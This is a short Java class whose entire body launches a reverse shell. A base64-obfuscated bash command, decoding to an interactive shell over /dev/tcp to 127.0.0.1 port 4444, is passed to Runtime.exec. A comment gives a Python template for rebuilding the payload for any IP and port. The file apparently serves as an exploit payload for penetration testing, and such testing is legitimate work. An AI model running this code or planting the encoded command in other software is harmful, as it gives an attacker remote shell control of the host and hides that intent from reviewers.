
public class r3 {
	public static void main(String argv[]) {
		
		Runtime r = Runtime.getRuntime();
		Process p = null;
		try {
            // In python: "bash -c {echo,%s}|{base64,-d}|{bash,-i}" % ("bash -i >& /dev/tcp/%s/%d 0>&1" % (ip, port)).encode('base64').strip()
			p = r.exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}");
			p.waitFor();
		}catch(Exception ex) {
			ex.printStackTrace();
		}finally {
			if(p != null)
				p.destroy();
		}
	}
}
